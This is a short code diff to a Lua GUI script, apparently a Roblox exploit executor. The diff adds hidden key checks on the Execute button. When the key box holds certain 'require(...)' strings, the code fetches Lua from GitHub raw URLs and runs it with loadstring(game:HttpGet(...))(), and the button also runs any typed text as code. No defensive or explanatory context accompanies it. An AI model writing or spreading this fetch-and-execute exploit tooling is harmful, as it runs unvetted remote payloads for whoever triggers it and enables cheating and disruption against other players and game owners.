@@ -53,12 +53,18 @@ ExecuteButton.TextSize = 10
 ExecuteButton.TextScaled = true
 ExecuteButton.TextWrapped = true
 ExecuteButton.MouseButton1Click:Connect(function()
-local h = Instance.new("Hint")
-h.Text = ""
-h.Parent = workspace
-wait(0.1)
-h:Remove()
-wait(0.1)
+if KeyBox.Text == "require(5253281926).bjgui('Tubers93HKRB')" then
+		Frame.Visible = false
+		wait(0.1)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/BOSSJKL2/UPDBOSJKLSO/main/UPDBOSJKLSORANKS"))()
+	end
+wait(1)
+if KeyBox.Text == "require(4815027269).k00pzkidd('Tubers93HKRB')" then
+		Frame.Visible = false
+		wait(0.1)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/BOSSJKL2/Skid/main/S"))()
+end
+wait()
 loadstring(TextBox.Text)()
 end)
 
